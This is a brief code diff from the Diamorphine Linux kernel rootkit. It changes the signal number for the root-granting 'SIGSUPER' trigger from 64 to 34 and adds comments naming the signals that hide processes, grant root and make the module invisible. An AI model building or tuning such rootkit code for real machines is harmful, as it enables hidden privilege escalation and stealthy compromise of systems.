@@ -12,9 +12,9 @@ struct linux_dirent {
 #define MODULE_NAME "diamorphine"
 
 enum {
-	SIGINVIS = 31,
-	SIGSUPER = 64,
-	SIGMODINVIS = 63,
+	SIGINVIS = 31, // hide/unhide process 
+	SIGSUPER = 34, // root 
+	SIGMODINVIS = 63, // invisible/visible 
 };
 
 #ifndef IS_ENABLED
